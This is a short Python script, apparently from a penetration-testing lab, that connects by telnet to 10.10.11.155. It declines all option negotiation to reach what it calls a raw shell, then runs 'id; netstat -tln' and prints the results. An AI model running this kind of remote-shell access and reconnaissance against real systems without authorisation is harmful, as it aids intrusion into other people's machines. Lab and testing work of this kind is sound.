import socket, time

s = socket.socket()
s.settimeout(2.0)
s.connect(('10.10.11.155', 23))

# 1. Read IAC negotiation
iac = s.recv(1024)
print('IAC received:', [hex(x) for x in iac])

# 2. Refuse all options (WONT) so server drops straight to raw shell
# Server asked: DO ECHO (1), DO NAWS (31), WILL ECHO (1), WILL SGA (3)
# We reply: WONT ECHO, WONT NAWS, DONT ECHO, DONT SGA
reply = b'\xff\xfc\x01\xff\xfc\x1f\xff\xfe\x01\xff\xfe\x03\r\n'
s.send(reply)
time.sleep(0.3)

try:
    print('After reply:', repr(s.recv(1024)))
except Exception as e:
    print('After reply exc:', e)

# 3. Send command
s.send(b'id; netstat -tln\r\n')
time.sleep(0.5)
try:
    print('Command output:\n', s.recv(4096).decode('utf-8', errors='replace'))
except Exception as e:
    print('Command exc:', e)

s.close()
